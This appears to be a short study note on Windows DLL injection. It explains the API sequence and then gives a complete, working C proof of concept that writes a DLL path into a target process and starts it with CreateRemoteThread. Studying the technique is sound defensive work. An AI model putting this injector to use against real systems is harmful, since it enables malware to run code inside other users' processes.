---
description: 06-21-2023
---

# DLL Injection

## What is DLL Injection?

It is a process injection technique that <mark style="color:yellow;">allows a malicious actor to be able to inject arbitrary code into another process</mark>.&#x20;

The malware <mark style="color:yellow;">writes the path to it's malicious DLL in the virtual address space of a legit process</mark> using [WriteProcessMemory()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory). This function will write data to an area of memory in a specified process.

It will then ensure the remote process loads it by creating a remote thread in the target process. This is performed via [CreateRemoteThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

## High Level Explanation

Program.exe -> OpenProcess() -> GetProcAddress() -> VirtualAllocEx() -> WriteProcessMemory() -> CreateRemoteThread()

1. Open/Create a process for injection
2. Allocate memory for the process
3. Write DLL's path to the region of allocated memory
4. Call <mark style="color:yellow;">LoadLibraryA</mark>/<mark style="color:yellow;">W</mark>/<mark style="color:yellow;">CreateRemoteThread()</mark> inside the remote process with the DLL path.

## PoC

inject-dll.c:

```c
#include <stdio.h>
#include <windows.h>

int main(int argc, char *argv[])
{
    HANDLE processHandle;
    HANDLE threadHandle;
    PVOID remoteBuffer;
    LPCSTR dllPath = "C:\\testcode\\hello-world-x64.dll";
    SIZE_T dllPathLength = strlen(dllPath) + 1;
    PTHREAD_START_ROUTINE threatStartRoutineAddress;

    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if(!processHandle)
    {
        printf("OpenProcess Failed: %d\n", GetLastError());
        return 0;
    }

    remoteBuffer = VirtualAllocEx(processHandle, NULL, dllPathLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(!remoteBuffer)
    {
        printf("VirtualAllocEx Failed: %d\n", GetLastError());
        return 0;
    }

    if(!WriteProcessMemory(processHandle, remoteBuffer, dllPath, dllPathLength, NULL))
    {
        printf("WriteProcessMemory Failed: %d\n", GetLastError());
        return 0;
    }

    threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
    threadHandle = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    if(!threadHandle)
    {
        printf("Remote thread failed. %d\n", GetLastError());
        return 0;
    }

    printf("Success\n");

    CloseHandle(threadHandle);
    CloseHandle(processHandle);

    return 0;
}
```
